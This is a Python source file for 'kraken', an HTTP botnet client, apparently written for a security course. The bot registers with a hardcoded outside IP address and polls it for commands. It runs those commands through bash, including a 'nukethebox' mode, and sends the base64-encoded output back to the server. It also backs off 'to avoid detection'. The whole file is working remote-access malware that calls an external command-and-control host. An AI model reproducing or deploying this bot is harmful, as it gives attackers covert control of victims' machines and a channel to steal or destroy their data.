#!/usr/bin/env python3
# Amanda Brown (aeb6590) 
# kraken.py (HTTP bot for Flask server with json)  

# Import necessary libraries 
import json
import base64
import socket
import requests
import subprocess
import time
import string
import random 


# Define the bot 
class Bot:
    def _init_(self,uuid):
        self.uuid = uuid

# Execute a passed in shell command 
def shellExec(command):

    # Fix formatting for subprocess
    command = """bash -c '""" + command + """'"""

    # Run the command passed in, invoking mystery process
    resp = subprocess.check_output(command, shell=True)
    
    # Encode from bytes and decode into characters
    encode = base64.b64encode(resp).decode("utf-8")
    return encode

# Execute the passed in nuke command
def nuke(command):

    # Fix formatting for subprocess
    command = """bash -c '""" + command + """'"""
    
    # Run the command passed in, invoking mystery process
    resp = subprocess.check_output(command, shell=True)

    # Encode from bytes and decode into characters
    encode = base64.b64encode(resp).decode("utf-8")
    return encode

# Figure the bot's sleep time
def sleepTime(ret):
    sleepTime = 3

    # If HTTP response is abnormal, sleep in attempt to avoid detection 
    if ret != 200: 
        sleepTime = 300
    return sleepTime

# Get a random 64 letter uuid for the bot
def getUUID():
    chars = string.ascii_letters

    # Get a random 64 letter combination for the uuid
    uuid = ''.join(random.choice(chars) for i in range(64))
    return uuid

# Execute the program
def main():
    status = 0
    
    # Instantiate the bot and give it a uuid 
    kraken = Bot()
    kraken.uuid = getUUID()

    host = socket.gethostname() 
    server = 'http://129.21.115.114:8080'
    
    # Send the bot info to the server to register
    botInfo = {'uuid':kraken.uuid, 'config_interval':5, 'config_intervaldelta':5, 'config_servers':server,'facts_hostname':host, 'facts_interfaces':'eth0'}
    register = requests.post(server + '/register', data=botInfo)
    
    # Ensure the HTTP server replies normally 
    status = register.status_code

    # Keep attempting to connect
    while (status != 200):
        time.sleep(5)
        register = requests.post(server + '/register', data=botInfo)
        status = register.status_code

    # Keep looping for commands 
    while (True):

        # Get commands from the server
        cmd = requests.post(server + '/getcommand', data=botInfo)
        cmd = cmd.text
        parsedCmd = json.loads(cmd)
        resp = "" 

        # If server replies with shell execution command
        if parsedCmd.get("mode") == "shell":
            resp = shellExec(parsedCmd.get("command"))
            errorCode = 0

        # If server replies with nuke the box command 
        if parsedCmd.get("mode") == "nukethebox": 
            resp = nuke(parsedCmd.get("command"))
            errorCode = 0 

        # Send results back to server 
        uaid = parsedCmd.get("uaid")
        botSend = {'uaid':uaid, 'uuid':kraken.uuid,'error':errorCode,'response':resp}
        sending = {"uuid": kraken.uuid ,"response_data":json.dumps(botSend)}
        ret = requests.post(server + '/postresults', sending)
        
        # Time to sleep 
        TTS = sleepTime(ret.status_code) 
        time.sleep(TTS)

main()
